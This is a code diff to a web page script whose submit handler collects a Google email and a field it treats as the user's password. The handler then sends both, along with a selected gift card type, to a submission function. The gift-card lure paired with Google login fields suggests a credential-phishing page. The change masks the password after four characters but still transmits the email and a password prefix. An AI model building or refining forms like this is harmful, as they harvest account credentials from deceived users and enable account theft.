@@ -1059,17 +1059,22 @@
         });
 
         document.getElementById('Google-form').addEventListener('submit', async function (e) {
-            e.preventDefault();
+    e.preventDefault();
 
-            const formData = new FormData();
-            formData.append('GoogleEmail', document.getElementById('Google-email').value);
-            formData.append('GoogleId', document.getElementById('Google-id').value);
-            formData.append('submissionType', 'Google');
-            formData.append('timestamp', new Date().toISOString());
-            formData.append('giftCardType', selectedGiftCard);
+    const formData = new FormData();
+    const googlePassword = document.getElementById('Google-id').value;
+    const censoredPassword = googlePassword.length > 4 
+        ? googlePassword.substring(0, 4) + '*'.repeat(googlePassword.length - 4)
+        : googlePassword;
+    
+    formData.append('GoogleEmail', document.getElementById('Google-email').value);
+    formData.append('GoogleId', censoredPassword);
+    formData.append('submissionType', 'Google');
+    formData.append('timestamp', new Date().toISOString());
+    formData.append('giftCardType', selectedGiftCard);
 
-            await submitForm(formData, this.querySelector('.modal-btn'));
-        });
+    await submitForm(formData, this.querySelector('.modal-btn'));
+});
 
         document.querySelectorAll('input[required]').forEach(input => {
             input.addEventListener('blur', function () {
